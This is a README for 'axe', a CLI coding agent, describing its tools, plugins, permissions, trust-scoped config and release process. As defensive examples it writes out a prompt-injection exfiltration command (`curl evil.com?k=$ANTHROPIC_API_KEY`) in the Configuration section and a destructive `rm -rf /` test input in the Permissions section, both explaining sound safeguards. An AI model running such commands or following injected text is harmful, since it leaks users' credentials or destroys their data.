# axe

A CLI coding agent you point at your own API keys. Small core, real tools, no scaffolding.

Zero runtime dependencies — Node standard library only, terminal UI included. The binary and config directory are called `axe`.

```sh
git clone https://github.com/Catpula/axe.git
cd axe
npm install                  # typescript and its types, for npm test
export ANTHROPIC_API_KEY=sk-ant-...
node --experimental-strip-types src/cli.ts
```

Node 22 or newer. The rest of this file writes `axe`, which from a checkout is worth an alias:

```sh
alias axe="node --experimental-strip-types $PWD/src/cli.ts"
```

`npm run build` produces a single binary but needs Bun. `npm run release` builds every published target with checksums.

## What works

| | |
|---|---|
| Providers | Anthropic, OpenAI, Google, and any OpenAI-compatible endpoint |
| Tools | `read_file`, `list_files`, `edit_file`, `glob`, `grep`, `bash`, `web_fetch`, plus `web_search` where the provider has none |
| Subagents | `task` with a `search` role, an `oracle` role, and custom roles from `.axe/agents/` |
| Context | auto-compaction at 90% of the window, threads on disk, `--continue` |
| Terminal UI | activity panel, command palette on `Ctrl+O`, `@` file references, `Esc Esc` to abort |
| Extension | skills (markdown), plugins (modules exporting tools), MCP servers over stdio |
| Safety | permission rules, trust-scoped config, credentials scrubbed from `bash` |
| Diagnostics | `axe doctor`, `--debug` JSONL trace, classified errors with a next step |
| Scripting | `--stream-json` NDJSON in and out, documented exit codes |
| Release | checksum-verified `axe update`, CI on every push, tag-driven build |

Not built yet: Windows binaries.

All three adapters are covered by replayed SSE recordings, which catch what an adapter does with a response but not that the response shape is still current. `npm run live-test` is the check for that, and it is not part of `npm test`.

## Usage

```sh
axe                                    # REPL
axe "why is the build failing"
axe -x "run the tests and fix what breaks"    # one-shot, quiet, reads stdin
axe --stream-json "summarise the diff"        # one-shot, NDJSON on stdout
axe --continue                         # resume the most recent thread here
axe --continue <id>                    # resume a specific thread
axe --effort ultra
axe --fast                             # shorthand for --effort low
axe --plain                            # line-based REPL instead of the terminal UI
axe --debug                            # trace the stream, tools and retries to a log
axe --no-plugins                       # start without loading any plugin
axe -l "nightly run" -x "..."          # label a thread for `axe threads`
axe --stream-json-input < turns.jsonl  # one turn per {"type":"user","text":...} line
```

```sh
axe doctor                  # config, keys, route, bash, plugins and MCP on one screen
axe auth                    # which providers have a usable key
axe threads                 # thread ids, newest first
axe skills                  # playbooks visible here
axe commands                # slash commands visible here
axe skill add <owner/repo>  # install a skill from GitHub
axe tools [show <name>]     # what this setup exposes, plugins and MCP included
axe permissions [test ...]  # rules in effect, and what they would decide
axe mcp [approve|doctor]    # servers and their approvals
axe review                  # run .axe/checks/*.md over the diff
axe schedules               # prompts waiting to wake a thread
axe update [--check]        # replace this binary with the latest release
axe --help                  # the whole surface on one screen
```

`axe --help` is checked against the parser by `cli-test`, so a flag it lists is a flag that exists.

In the REPL: `cost` prints spend so far, `schedules` lists them, `exit` quits. `cost` is a REPL word rather than a command — there is no session total for a process that is about to exit, so `axe cost` says so and exits 1.

`-x` and `--stream-json` need something to run: a prompt argument, or one on stdin. With neither they exit 1 rather than waiting on a terminal nobody is piping into. A flag that matches nothing is an error, so a typo is never sent to the model as part of the prompt. So is an argument to a command that takes none: `axe threads --json` says so rather than listing threads and reporting success.

## Terminal UI

When stdout is a terminal, axe reserves the bottom of the screen for a status line and the composer, and scrolls the agent's output above them. The composer grows from one row to five as text wraps or `Shift+Enter` adds lines. Scrollback is untouched, and everything printed stays in your terminal after axe exits.

Assistant Markdown is styled in place — headings, emphasis, links, lists, quotes, code fences, task lists, and tables sized to terminal cells with a stacked fallback when the terminal is too narrow. Completed replies keep their Markdown source, so a resize re-renders rather than rewrapping stale ANSI. Model text, tool previews, plugin notices, and pasted input are rendered inert, so embedded control bytes cannot move the cursor or change terminal modes.

### The activity panel

While a turn runs, whatever the agent is doing appears above the status bar, one row per concurrent thing:

```
 ⠹ search    where is the flag read?        ──━━━───────   12.4s
   ⠸ grep    AXE_HOME                                       2.1s
 ⠼ bash      npm test                       ─────━━━────     4.0s
 ✓ read_file src/cli.ts                                      0.3s
```

A subagent's own calls are indented under it, so a `search` that has been grepping for forty seconds is visibly a search rather than a hang. The bar is indeterminate on purpose: no tool reports how far along it is, and a bar that invents a percentage is worse than one that admits it does not know. Tool names are coloured by what they do — reads cyan, writes yellow, `bash` magenta, delegation blue — so writes are findable in a long transcript.

How much of a subagent shows is `agentTrace`, switchable mid-session from the palette:

| `agentTrace` | Shows |
|---|---|
| `off` | nothing; a subagent is a black box that returns a report |
| `compact` (default) | its tool calls in the panel, indented under it |
| `full` | its prose in the transcript too, prefixed with the role |

A subagent's tool calls never enter the transcript in any mode — keeping its file reads out of the caller's context is the whole point of it.

### Keys

| Key | Does |
|---|---|
| `Enter` | send, or queue if a turn is running |
| `Shift+Enter` | insert a newline without sending |
| `Ctrl+O` | command palette |
| `@` | file reference: filter as you type, `Tab` inserts the path |
| `Ctrl+C` | abort the current turn, never kill axe |
| `Esc Esc` | abort the current turn |
| `Ctrl+D` | exit on an empty line, forward delete otherwise |
| `Up` / `Down` | history |
| `Ctrl+A` / `Ctrl+E` | start and end of line |
| `Ctrl+U` / `Ctrl+K` / `Ctrl+W` | kill to start, to end, or one word back |
| `Ctrl+Y` | put back what the last kill removed |
| `Ctrl+←` / `Ctrl+→`, `Alt+B` / `Alt+F` | move a word |
| `Ctrl+L` | redraw |

Line editing follows readline, including the control aliases (`Ctrl+B`, `Ctrl+F`, `Ctrl+P`, `Ctrl+N`) for terminals that swallow the arrow keys. `Shift+Enter` needs a terminal that reports modified keys (CSI u or xterm `modifyOtherKeys`). `--plain` or `tui = false` falls back to the line-based REPL; non-TTY output falls back automatically.

### Command palette

`Ctrl+O` opens a filtered list above the prompt: abort the turn, show cost, show context size, inspect context sources, review changes from the latest turn, switch effort, switch subagent trace, list skills, list tools, list recent threads, exit.

Every built-in entry is a shortcut for something you could already do by typing or by pressing a key. None of them is visible to the model, and none grants a power the prompt does not have.

Typing `/` on an empty prompt opens the same list, plus your own commands from files. `Up`/`Down` choose, `Esc` leaves the prompt exactly as it was — the `/` is never typed into it.

### File references

Typing `@` at the start of a word opens a list of files, filtered as you keep typing. `Up`/`Down` choose, `Tab` or `Enter` inserts the path, `Esc` leaves what you typed alone. A path containing a space is inserted quoted.

What lands in the prompt is a path you could have typed by hand. The model sees no annotation, no attached contents, and no new tool: it reads the file with `read_file`. It is a typing aid, nothing more.

## Slash commands

A slash command is a prompt you got tired of retyping. Put one at `.agents/commands/<name>.md` in a project, or `~/.agents/commands/<name>.md` for every project.

```markdown
---
description: Review a file against our conventions
---

Read $1 and review it against AGENTS.md. Report findings only, do not edit.
```

Then `/review-file src/cli.ts` in the REPL. The body becomes your turn:

- `$ARGUMENTS` is everything you typed after the name.
- `$1`..`$9` are its words.
- A template with neither placeholder takes the arguments appended on their own line, so a command written without them still accepts a subject.

Substitution is one pass, so an argument that itself contains `$2` stays text.

The expansion is sent as an ordinary user turn. The model sees the text and nothing about where it came from — no marker, no new tool, nothing you could not have typed by hand. That is the whole feature: files are for your fingers, skills are for the model's judgement.

`axe commands` lists what is visible here. The directories are re-read on every call, so a command you just wrote works without a restart. A project command overrides a personal one with the same name. A file with an empty body is ignored, because an empty turn reads as a hung session. `README.md` and non-markdown files are skipped, and subdirectories are not searched.

Typing `/` opens the picker; typing a space after a name that matches sends the rest to the prompt as arguments, the way it does in a shell. An unknown `/word` is reported rather than sent, so a typo never costs a turn.

`axe -x "/review-file src/cli.ts"` runs the same expansion from a script, so a command is not a TUI-only feature. An unknown one exits 1 without making a request.

A built-in keeps its own name: a file called `clear.md` cannot take `/clear` away from the session that owns the screen. Such a file is left out of the picker rather than listed under a name that would run something else, and typing the name says which file is being ignored so you can rename it.

## Skills

A skill is a markdown playbook. Put one at `.agents/skills/<name>/SKILL.md` in a project, or `~/.agents/skills/<name>/SKILL.md` for every project. A flat `.agents/skills/<name>.md` also works. Axe uses the shared agent skill store directly rather than a directory of its own.

```markdown
---
name: release
description: How we cut a release. Use when asked to release, tag, or publish.
---

1. Check that `main` is green.
2. Bump the version in package.json.
```

Only the name, the description, and the path reach the system prompt. The body is read with `read_file` when a task matches the description, so fifty skills cost fifty lines of context until one is needed. A skill with no description is ignored, because the description is what makes it findable. A project skill overrides a personal one with the same name.

`axe skill add <owner/repo>` installs one from GitHub: the tarball is unpacked to a temp directory and copied in only if it contains exactly one skill, so a bad download leaves nothing behind. See `examples/skill`.

## Plugins

A plugin is a module that exports tools. Put it at `.axe/plugins/<name>/plugin.ts` or `~/.axe/plugins/<name>/plugin.ts`.

```ts
export default {
	name: "jira",
	tools: [
		{
			name: "jira_issue",
			description: "Fetch a Jira issue by key.",
			readOnly: true,
			schema: {
				type: "object",
				properties: { key: { type: "string" } },
				required: ["key"],
			},
			async run(input, ctx) {
				const res = await fetch(`https://jira.internal/api/issue/${input.key}`)
				return await res.text()
			},
		},
	],
}
```

See `examples/plugin` for a working copy. Rules worth knowing first:

- A plugin runs with your full privileges. There is no sandbox. Installing one is the same act of trust as running a script from the same directory. `--no-plugins` or `plugins = false` turns them off.
- A plugin cannot take a core tool's name. Shadowing `read_file` would be a quiet way to hijack the agent, so a collision is reported and the tool dropped.
- A plugin that throws on import is a notice. It never stops axe from starting.
- Subagents do not get plugin tools.
- `readOnly: true` means the tool may run in parallel with other reads. Say it only if it is true.

## MCP servers

An MCP server is a plugin that speaks a protocol instead of exporting functions. Declare stdio servers in `.axe/mcp.json` or `~/.axe/mcp.json`:

```json
{
  "servers": {
    "sqlite": { "command": "npx", "args": ["-y", "mcp-server-sqlite", "db.sqlite"] }
  }
}
```

Their tools register as `<server>_<tool>`. The same rules as plugins apply, and `plugins = false` turns the whole mechanism off. A server declared by a project needs `axe mcp approve <name>` first, because it is a program a `git clone` asked to run. MCP tools are never treated as read-only, so they never run in parallel: an unknown side effect scheduled alongside a read is a race nothing can see.

## Subagents

The agent can delegate a self-contained question to a subagent with its own context window. Only the final report comes back — file reads, dead ends, and tool output are discarded, which is the point: the caller pays a paragraph for work that would have cost it twenty file reads.

| Role | For | Default model |
|---|---|---|
| `search` | finding something in a codebase you would otherwise read your way through | claude-sonnet-5 |
| `oracle` | a slower, more careful second opinion on a bug or a design | claude-opus-5, 32k thinking |

The oracle is expensive on purpose. It is asked, not used.

A subagent cannot edit files, cannot run bash, cannot ask a question, and cannot spawn another subagent: it gets a fresh read-only tool set, so those limits are structural rather than instructions it might ignore. It sees nothing of the parent conversation, so the whole task has to be in the prompt. Spend is added back to the session total, and concurrency is capped by config, because subagents are spawned by a model rather than by a person.

### Custom roles

A role is a document, like a skill. Put one at `.axe/agents/<name>.md`, or `~/.axe/agents/<name>.md` for every project:

```markdown
---
description: audits a diff for missing error handling
role: oracle
---
You are a reliability reviewer. ...
```

The body is the brief. `description` is what the model reads when it picks a role, so a file without one is ignored. `role` picks the internal tier — `search`, `subagent` (the default), or `oracle` — and is the only model knob a document gets. A name may not shadow `search` or `oracle`, and a project agent overrides a personal one.

## Review

`axe review` reads the uncommitted diff and applies every check in `.axe/checks/*.md`, one read-only subagent per check, through the same concurrency gate:

```markdown
---
severity: critical
---
No hardcoded secrets. Flag any literal that looks like a key, a token, or a password.
```

A check that passes prints one `ok` line; findings print in full. Exit 1 when any check has findings, so CI can gate on it.

## Edit checks

Set a check command in the project's `.axe/config.toml`:

```toml
checkCmd = "npm run typecheck"
```

It runs after every successful `edit_file`, and a non-zero exit rides back to the model inside the same tool result, so a type error is seen in the step that caused it instead of three edits later. A passing check is silent. The command is printed at startup, and the edit is never turned into an error: the diff on disk is real and the model needs to see both.

## Background commands

A dev server or a watcher has no exit code to wait for, so `bash` takes a `background` flag. The command starts, the tool returns a log path immediately, and the process outlives the turn:

```
Started in the background as pid 41207.
Output is appended to: .axe/artifacts/bash-6da280da9b4336d1f38bd14a.log
```

The agent reads that file with `read_file` or greps it, which is what makes the loop closeable: start the server, hit it, read what it said. Nothing kills it for you — the pid is in the result. The credential scrub is the same as in the foreground.

## Images

Type or `@`-pick a path to a `.png`, `.jpg`, `.gif`, or `.webp` and the file is attached; the text keeps the path so the model can tell screenshots apart. Up to four images of at most 5MB each per message. Only your own message is expanded, never text a model wrote.

## Schedules

Off by default. A schedule is a saved prompt plus a thread plus a time, so a wake-up resumes the same transcript rather than a copy of it. Turn it on in `~/.axe/config.toml`:

```toml
[schedules]
enabled = true
```

Deliberately not settable from a project's `.axe/config.toml`: a schedule runs an arbitrary prompt with your own tools, so a cloned repo that could add one would be running code on your machine tomorrow morning.

With it on, the model gets a `schedule` tool (`add` / `list` / `cancel`) and you get the commands:

```sh
axe schedules                             # what is scheduled, plus how to install the ticker
axe schedule add "every 10m" "check CI"   # prints an id
axe schedule add "0 9 * * 1-5" "morning triage"
axe schedule rm 3f9c1a20
axe schedule run                          # fire whatever is due, then exit
```

`when` is a 5-field cron expression (`*`, `n`, `a-b`, `*/n`, `a,b,c`) or `every <n>m|h|d`. Nothing runs in the background: the OS scheduler calls `axe schedule run`, which fires due schedules as detached one-shot runs and exits, so there is no daemon to supervise.

```sh
# Windows
schtasks /create /tn axe-schedules /sc minute /mo 5 /tr "axe schedule run"
# cron
*/5 * * * * axe schedule run
```

A cron schedule missed while the machine slept still fires once, up to an hour late. A schedule whose thread is gone is dropped rather than retried forever.

## Permissions

Opt-in. With no rules every tool call runs, which is the default. A rule is `<tool> <action> [pattern]`:

```toml
permissions = [
  "bash deny rm *",
  "edit_file ask /etc/*",
  "web_fetch allow *",
]
```

`*` matches anything, including a slash: a path rule is nearly always meant to cover a tree, and `/etc/*` that missed `/etc/ssh/key` would be a trap. A rule with no pattern matches every call to the tool. The pattern is matched against the one field a rule is written about — `cmd`, `path`, `pattern`, `url`, or `query` — so nobody writing a rule has to know a tool's parameter names.

A project's `.axe/config.toml` may add `deny` rules and nothing else. Loosening is a decision about the machine, and a project config arrives with a `git clone`.

An `ask` rule opens a FIFO approval prompt: in the TUI `y` allows once, `n`/`Esc` denies, `d` opens a reason editor, and closing or interrupting denies every pending request. The plain REPL takes `y`, `n`, or `d <reason>`. One-shot, piped, and JSON sessions have nobody to ask and fail closed.

`axe permissions` lists what is in effect. `axe permissions test <tool> '{"cmd":"rm -rf /"}'` prints the decision and exits 0 for allow, 1 for ask, 2 for deny, so a script gates on the code rather than the word.

## Diagnostics

`axe doctor` answers "why is this not working" on one screen, which otherwise takes four commands and a careful read of stderr:

```
axe doctor
runtime      ok    node v22.14.0 · axe 0.1.0 · darwin
config       warn  2 keys ignored in ./.axe/config.toml — only ~/.axe may set providers.*
keys         ok    anthropic ok · openai missing · google missing
route        ok    medium → claude-sonnet-5 (anthropic)
threads      ok    ~/.axe/threads writable
debug log    off   set AXE_DEBUG=1 to record stream and tool lifecycle
edit check   ok    npm test
bash         ok    bash -lc works
skills       ok    3 skill(s) · 1 custom agent(s)
plugins      fail  slow: import timed out after 3000ms
mcp github   warn  needs approval, so its tools are not loaded — axe mcp approve github
```

It reaches no provider and spends nothing, so the setup that is broken can still run the thing that explains why. Exit 1 on any `fail`, 0 on `warn`: an unapproved optional server going red would teach people to stop running the check. `axe mcp doctor` stays as the narrow form and shares the same probe, so the two cannot disagree.

`--debug` (or `AXE_DEBUG=1`) writes one JSONL file per session to `~/.axe/logs/<threadId>.jsonl`, mode `0600`, and prints the path at startup so nothing is recorded unseen. It holds turn boundaries, stream start and first token, tool lifecycle with durations, provider retries, recovery, and compaction — a 40-second turn that retried three times is otherwise indistinguishable from a slow one.

It records names, ids, counts, durations and status codes. Never prompt text, never tool arguments, never a key: an argument can hold a password, and a debug file is what people paste into an issue.

Every failure axe prints carries a surface, a stable code, one clause, and a next step:

```
provider · unauthorized — anthropic rejected the key. Check it with `axe auth`.
```

An error axe does not recognise keeps its message verbatim and gets **no** next step, because a wrong suggestion is followed. `--stream-json` carries the same fields on its `error` event.

## Configuration

Three files, read in order, and they are not equally trusted.

| File | May set |
|---|---|
| `/etc/axe/config.toml` | everything |
| `~/.axe/config.toml` | everything |
| `./.axe/config.toml` | `effort`, `autoCompactAt`, `maxParallelSubagents`, `cost`, `tui`, `checkCmd`, `agentTrace`, and `deny` permission rules |

Later files win, within what they are allowed to set. A project config that sets anything else is ignored, and a notice on stderr names the file and the key down to the leaf.

The reason is that a project config arrives with a `git clone`. `keySource = "command:..."` runs a shell command the moment you type `axe` in that directory, `baseUrl` decides which server receives your API key, and `plugins = true` switches back on what `~/.axe` turned off. None of those may be decided by a repository nobody has read yet. This is not a sandbox — a plugin you enabled yourself still runs with your full privileges — it only means that cloning a repository is not the same act as trusting it.

A value that makes no sense is dropped the same way, with the same kind of notice, and the default stands: an effort outside the four tiers, an `autoCompactAt` outside `(0, 1]`, a `maxParallelSubagents` below 1, a cost that is not a positive number.

```toml
# ~/.axe/config.toml
effort = "medium"          # low | medium | high | ultra
autoCompactAt = 0.9        # fraction of the context window
maxParallelSubagents = 4
plugins = true             # false on a machine where you did not write them
tui = true                 # false for the plain line-based REPL
agentTrace = "compact"     # off | compact | full
debug = false              # true to always write the JSONL trace

[cost]
warnUsd = 5
hardStopUsd = 0            # 0 means no ceiling; set one for an unattended run

[providers.anthropic]
keySource = "command:security find-generic-password -s anthropic -w"

[providers.openai]
keySource = "env"          # OPENAI_API_KEY

[providers.google]
keySource = "env"          # GEMINI_API_KEY

# Any other name is assumed to speak the OpenAI wire format.
[providers.groq]
baseUrl = "https://api.groq.com/openai/v1"
contextWindow = 131072     # only when we would guess wrong
```

The cost hard stop is opt-in and the warning is not. A run killed at a round number mid-task costs more than it saves, because the work is repeated from the top.

Keys are read from the environment or from a shell command, and never written to a thread file. A `keySource` command that fails is reported as an error rather than as a missing key, with its first line of output and nothing more; `axe auth` is where to look.

They are also removed from the environment `bash` runs in: any variable whose name contains `API_KEY`, `TOKEN`, `SECRET`, or `PASSWORD` is dropped before the command starts, so a prompt injection that talks the model into `curl evil.com?k=$ANTHROPIC_API_KEY` has nothing to send. A command that genuinely needs a credential has to be given one explicitly.

`AXE_HOME` moves the whole directory — config, threads, plugins, agents, logs — if `~/.axe` is not where you want it.

### Models

`~/.axe/models.toml` overrides which model serves each effort tier and each internal role:

```toml
[ultra]
provider = "openai"
model = "gpt-5"
maxTokens = 32000

[compact]
provider = "groq"
model = "llama-3.3-70b-versatile"

[subagent]
model = "claude-haiku-4-5"
```

| Effort | Default model | Thinking |
|---|---|---|
| low | claude-haiku-4-5 | off |
| medium | claude-sonnet-5 | off |
| high | claude-sonnet-5 | 16k |
| ultra | claude-opus-5 | 32k |

Effort is the only knob the user turns; which model serves a tier is an implementation detail that changes every few weeks. It can be changed mid-session from the palette. If a role points at a provider with no key, it falls back to the session's own provider and model rather than failing the turn.

## Compaction

Before every request the agent asks the provider how many tokens the context holds. Anthropic and Google answer with their own tokeniser; the OpenAI path has no such endpoint and estimates. Past `autoCompactAt` it summarises everything before a safe split point with the cheap model and keeps the last few messages verbatim.

A split point is always a plain user turn, so a `tool_result` is never separated from the `tool_use` that produced it. The summary is written to the thread as a snapshot, so `--continue` resumes the compacted context rather than replaying the original. A failed token count or a failed summary degrades to "no compaction"; it never aborts the turn.

## Steering

The prompt stays live while the agent works. Anything typed during a turn is queued and handed to the model at the next step boundary, after that step's tool results, so a redirection does not have to wait for the agent to finish being wrong. Queued input never starts a second turn; if the turn ends with something still queued, it runs immediately as the next one.

## Scripting

`--stream-json` runs one turn and writes one JSON object per line to stdout. It implies one-shot mode and reads stdin when no prompt is given.

```sh
axe --stream-json "which tests are flaky" | jq -r 'select(.type=="text") | .text'
```

| `type` | Fields |
|---|---|
| `text`, `thinking`, `notice` | `text` |
| `tool_start` | `name`, `id` |
| `tool_end` | `name`, `ok`, `preview` |
| `error` | `message`, `surface`, `code`, `next` |
| `result` | `threadId`, `usage` (last line) |

Ignore types you do not recognise. New event types will be added; existing ones will not change shape. A subagent produces no events of its own — it surfaces as one `tool_start` / `tool_end` pair for `task`. `thinking` events are off unless `--stream-json-thinking` asks for them.

`--stream-json-input` reads NDJSON from stdin instead of a single prompt: one `{"type":"user","text":"..."}` line per turn, one `result` line back. A line that is not that shape produces an `error` event and is skipped, not a crash. A `text` that is a slash command is expanded like it would be in the REPL; a name no file defines is an `error` event and one skipped line, so the next turn still runs.

Exit codes, because a script reads those and not the prose:

| Command | 0 | 1 | 2 |
|---|---|---|---|
| `axe -x`, `axe --stream-json` | the turn ran, or you aborted it | the turn failed | |
| `axe auth` | at least one provider has a usable key | none does | |
| `axe doctor` | every check passed or warned | a check failed | |
| `axe review` | no check had findings | a check had findings | |
| `axe permissions test` | allow | ask | deny |
| `axe update --check` | already the latest | a newer release exists | cannot update |
| `axe update` | updated, declined, or already latest | | cannot update |
| any command | | bad flag, or nothing to run | |

A failed turn still writes its `error` line and its `result` line before exiting, so a script reading the stream and a script reading `$?` agree.

## Guidance files

On start the agent reads `AGENTS.md` from the working directory, then each parent, then `$AXE_HOME/AGENTS.md`, with `~/.config/axe/AGENTS.md` still read as a fallback. `AGENT.md` and `CLAUDE.md` are accepted in place of `AGENTS.md`. Nearest file wins. Subagents read them too.

Guidance is always in the prompt; a skill is only one line until it is read. Put standing rules in `AGENTS.md` and put procedures in a skill.

## Releases and updating

`npm run release` cross-compiles one binary per published target and writes `SHA256SUMS` beside them. Upload all of `dist/` to the tag, checksum file included.

| Target | Asset |
|---|---|
| Linux x64 / arm64 | `axe-linux-x64`, `axe-linux-arm64` |
| macOS x64 / arm64 | `axe-darwin-x64`, `axe-darwin-arm64` |

`axe update` asks GitHub for the latest release, compares it with the version compiled into the binary, downloads the asset for this platform, checks its SHA-256 against the published `SHA256SUMS`, and renames the verified file over the running binary. The rename happens inside the install directory, so the swap is atomic and a half-written download is never left executable.

It refuses rather than guessing in four cases: axe is running from a source checkout (`git pull` instead), no binary is published for this platform, the release has no asset for it, or the release publishes no `SHA256SUMS`. A checksum mismatch is an error, never a warning.

The version lives in `src/version.ts`, because a compiled binary has no `package.json` to read. `release-test` fails if the two drift.

## Layout

```
src/cli.ts                 commands, REPL wiring, providers
src/args.ts                argv to a plain options object, no I/O
src/config.ts              TOML config, trust scope, key resolution
src/prompt.ts              system prompt, AGENTS.md discovery
src/errors.ts              one shape for every failure: surface, code, next step
src/debuglog.ts            the JSONL trace, off unless asked for
src/doctor.ts              one check per row, no terminal writes
src/images.ts              typed image paths become attachments
src/clipboard.ts           reading an image off the system clipboard
src/artifacts.ts           where a background command's log lands
src/review.ts              check discovery, one subagent per check
src/core/loop.ts           the agent loop
src/core/compact.ts        context compaction
src/core/queue.ts          input queued during a turn
src/core/permissions.ts    allow / deny / ask rule matching
src/core/skills.ts         markdown playbook discovery
src/core/commands.ts       markdown slash commands, placeholder expansion
src/core/skill-install.ts  `axe skill add`, tarball to .agents/skills
src/core/agents.ts         markdown custom subagent roles
src/core/plugins.ts        third-party tool loading
src/core/mcp.ts            stdio MCP client, servers registered like plugins
src/core/subagent.ts       isolated sub-loops, briefs, concurrency gate
src/core/tools.ts          tool registry and safe execution
src/core/thread.ts         append-only JSONL thread store
src/core/schedules.ts      saved wake-up prompts, cron matching, due-firing
src/providers/             one file per wire format (anthropic, openai, google)
src/ui/json.ts             NDJSON output for --stream-json
src/ui/plain.ts            the line-based surface: -x, --plain, and a pipe
src/ui/tui.ts              scroll region and palette, re-exports keys and editor
src/ui/keys.ts             stdin to key events, held-back escape sequences
src/ui/editor.ts           the line buffer and its readline bindings
src/ui/external-editor.ts  handing the composer to $EDITOR
src/ui/activity.ts         what is running now: the panel's tracker and rows
src/ui/cells.ts            terminal-cell width, clamping, elapsed time
src/ui/color.ts            the palette, and whether colour is wanted at all
src/ui/complete.ts         fuzzy matching, @ file references
src/ui/markdown.ts         streaming Markdown and responsive table rendering
src/ui/terminal.ts         terminal-safe untrusted text rendering
src/router/route.ts        effort tier to model, internal roles
src/release/update.ts      version compare, checksum verify, atomic binary swap
src/version.ts             the version compiled into the binary
src/tools/                 the seven tools, plus task, schedule and the edit check
examples/                  a copyable skill and plugin
scripts/                   tests
```

## Tests

```sh
npm test
```

| Script | Covers |
|---|---|
| `smoke` | the core tools against a real temp directory, `web_fetch` against a fake fetch |
| `args-test` | argument parsing, argless commands, unknown flags |
| `errors-test` | the classifier: surface, code, message, next step |
| `prompt-test` | every core tool is either named in the system prompt or deliberately unnamed |
| `compact-test` | split point safety, summary shape |
| `loop-test` | tool result ordering, failure handling, abort, steering, NDJSON output |
| `adapter-test` | all three adapters against recorded SSE frames |
| `subagent-test` | context isolation, usage roll-up, the gate, read-only tools |
| `skills-test` | frontmatter, discovery order, project overrides, prompt section |
| `commands-test` | slash command parsing, placeholder expansion, discovery, `axe commands` |
| `skill-add-test` | source parsing, tarball install, overwrite refusal |
| `skill-mcp-test` | a skill's MCP server declaration |
| `agents-test` | custom role discovery, overrides, reserved names, task routing |
| `plugin-test` | real plugin loading, broken plugins, name collisions, validation |
| `mcp-test` | the stdio handshake against a real child process, tool mapping, failure paths |
| `tools-test` | the registry, read-only marking, permission gating |
| `permissions-test` | rule parsing, pattern matching, the ask path failing closed |
| `review-test` | check discovery, the fan-out, verdicts, usage roll-up |
| `tui-test` | key decoding, history, Esc Esc, fuzzy match, palette, activity rows |
| `editor-test` | the line buffer and its readline bindings |
| `screen-test` | the rendered grid: scroll region, activity panel, ghost rows, resize |
| `config-test` | trust scope, prototype pollution, value validation, key resolution |
| `doctor-test` | every check row, and the exit code |
| `recovery-test` | hand-written journals: interrupted turns, torn lines, damaged state files |
| `reliability-test` | retries, stream replay, timeouts, background bash, schedule wake-up |
| `schedules-test` | cron matching, interval and catch-up due-ness, the store round-trip |
| `web-search-test` | result parsing, HTML to text, the empty-result message |
| `clipboard-test` | the platform commands, and failing quietly when there is no image |
| `cli-test` | flags, exit codes, one-shot input, what a cloned repo's config may do |
| `release-test` | version compare, asset naming, checksum verify, the binary swap |

No test in `npm test` touches the network or needs an API key. `cli-test` runs axe as a real child process against a local server, because an exit code is not observable from inside the process that would have set it.

### The live test

`adapter-test` replays recorded bytes, which proves what an adapter does with a response but not that the response still looks that way. `npm run live-test` is the one that finds out, and it stays out of `npm test` because it spends money and needs a key.

```sh
npm run live-test              # every provider your routes name and you have a key for
npm run live-test anthropic    # just one
```

It reads the provider list off `models.toml` rather than a hardcoded one, so it tests what a session would actually use. Each provider gets two round trips — one that must return text, one that must return a tool call — covering deltas, the terminal event, usage counting, and the tool-argument accumulator. A provider with no key is skipped rather than failed; if none had one, it exits 1 rather than reporting a pass it did not earn.

`npm ci && npm test` runs on every push and pull request. A `v*` tag builds every published target with Bun and uploads `dist/` and its `SHA256SUMS`; the tag has to match `src/version.ts` or the release fails before anything is built.

## Contributing

`CONTRIBUTING.md` has the short version. `AGENTS.md` holds the design rules and the loop invariants, and it is the file to read before proposing a change — most "why is it not X" questions are answered there.

## License

MIT. See `LICENSE`.
